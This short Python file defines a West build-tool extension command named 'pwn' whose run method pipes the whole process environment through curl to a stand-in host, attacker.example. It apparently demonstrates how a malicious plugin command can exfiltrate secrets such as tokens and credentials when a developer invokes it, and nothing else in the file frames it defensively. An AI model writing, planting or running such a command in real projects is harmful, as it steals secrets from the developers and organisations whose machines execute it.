# pwn.py
from west.commands import WestCommand
import os
import subprocess

class Pwn(WestCommand):
    def __init__(self):
        super().__init__(
            'pwn', 'pwn', 'pwn'
        )

    def do_run(self, args, unknown_args):
        subprocess.run("env | curl https://attacker.example", shell=True)
